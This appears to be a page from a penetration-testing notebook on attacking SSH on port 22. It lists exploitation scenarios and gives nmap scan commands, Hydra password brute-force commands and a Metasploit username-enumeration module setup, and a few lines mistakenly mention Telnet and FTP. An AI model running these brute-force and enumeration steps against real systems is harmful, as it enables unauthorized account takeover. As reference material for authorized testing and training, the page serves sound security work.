# 22 - SSH

## Theory

The Secure Shell (SSH) protocol is a method for securely sending commands to a computer over an unsecured network. SSH uses cryptography to authenticate and encrypt connections between devices.

### Exploitation Scenarios

An SSH server can be exploited in different ways; here are the common scenarios that you should be looking for

* Credentials brute‐force (this is our main target during the enumeration phase).
* Appending a public key to the authorized\_keys file on the server (but you will need a shell to be able to write into that file; in other words, you will need to have access to the host first).
* SSH can be used to pivot to another host on the network. This can be achieved if one host is compromised and the attacker has access to the public and private keys on the victim's host (pivoting is a post‐exploitation task).
* Find a public exploit associated with the target Telnet server version.
* If the attacker can read the authorized\_keys file of a DSA (not RSA) algorithm, then the attacker can use the public generated private keys and try to match it to the public key inside the authorized\_keys file. (You will need a remote shell first or to read the file using the “local file inclusion” vulnerability of a web application. Once the attacker knows the private key associated with that public key, then the attacker can use the following command:

```
ssh -i [private key file] [user@ftp_server_ip]
```



***

## Practical

### Nmap NSE Scan

```
nmap ‐sV ‐O ‐sC ‐p22 ‐T5 <IP>
```

```
nmap ‐sV ‐O ‐‐script=ssh* ‐p22 ‐T5 <IP>
```

### Brute Force

#### Hydra

```
hydra ‐t 10 ‐L <User List> ‐P <Password List> ssh://<IP>
```

```
hydra ‐t 10 ‐e nsr ‐L <User List> ‐P <Password List> ssh://<IP>
```

* "n" stands for null password (the password is empty).
* "s" stands for log in as password (username=password).
* "r" stands for reversed login (e.g., if the username is root, then the password will be toor).

#### Metasploit

_**Username Enumeration:**_

```
msfconsole

use auxiliary/scanner/ssh/ssh_enumusers

set RHOSTS <IP>

set USER_FILE <path to wordlist>

set RPORT 22

set THREADS 25

run
```



***

## REFERENCES

* [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)
* [https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh)
* [https://www.rapid7.com/db/modules/auxiliary/scanner/ssh/ssh\_enumusers/](https://www.rapid7.com/db/modules/auxiliary/scanner/ssh/ssh\_enumusers/)
